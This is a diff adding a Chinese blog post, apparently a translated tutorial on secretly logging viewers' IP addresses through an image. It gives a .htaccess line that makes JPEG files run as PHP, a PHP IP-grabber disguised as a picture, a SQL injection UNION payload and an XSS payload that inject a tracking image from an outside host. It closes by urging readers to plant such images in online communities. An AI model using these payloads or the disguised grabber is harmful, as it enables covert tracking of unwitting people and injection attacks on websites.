@@ -1,0 +1,47 @@
+
+---
+layout: post
+title: 如何通过一张照片来获取ip地址？
+categories:
+- 今日头条
+tags:
+---
+				![](http://p3.pstatp.com/large/4860003776ff1320546)
+
+通过对htaccess的利用，实现用一张照片获取他人的ip地址
+
+在本教程中，我们将学习如何用一张照片来盗取ip地址。我的想法是通过修改.htaccess文件，将jpg文件当作php文件来解析。
+
+下面就是我们需要向.htaccess中添加的代码：
+
+AddHandler application/x-httpd-php5 .jpg
+
+然后将下面的代码复制到记事本中，命名为grabber.jpg
+
+<?php$fh = fopen('ip_list.txt', 'a');fwrite($fh, $_SERVER['REMOTE_ADDR']."");fclose($fh);$im = imagecreatefromjpeg("n00b.png");header('Content-Type: image/jpeg');imagejpeg($im);imagedestroy($im);?>
+
+将grabber.jpg的权限设置为755，然后再找一张照片，将其命名为n00b.png，接着放到与grabber.jpg相同的目录之中。
+
+就这样，一切工作就绪了。当别人浏览grabber.jpg这张照片的时候，他的ip地址就会被记录下来。
+
+（译者注：需要把这些东西上传至我们的个人网站空间中）
+
+POC：
+
+(译者注：作者这里贴了一张可获取ip的演示照片，为了大家的隐私，我没有将其贴出，读者可自行去作者博客查看)
+
+至此，我们的照片已经可以开始工作了。
+
+接着我还想说明一下如何使用SQLi来获取ip地址。其实使用照片来盗取ip地址十分快捷，我们没有理由去使用SQLi这种方法，但是为了让读者获取到更多的知识，我还是说明一下吧：
+
+http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1' union select 1,0x3c696d67207372633d22687474703a2f2f6c65657474696d652e6e65742f6964696f74735f746573745f6c61622f696d61676569702f7472796d652e6a7067223e,3#
+
+现在，再说一下如何使用xss来获取ip地址：
+
+http://leettime.net/xsslab1/chalg1.php?name=<img src="http://leettime.net/idiots_test_lab/imageip/tryme.jpg">&submit=Search
+
+好了，就是这些了。
+
+我们可以用这个技巧做许多有趣的事情，事实上大部分社区都允许我们发布一些照片，所以我们可以用这个方法去获取所有访问到我们照片的人的ip地址。
+
+想了解更多关于「互联网安全」或「黑客资讯」？请在微信或QQ搜索公众号：互联网安全
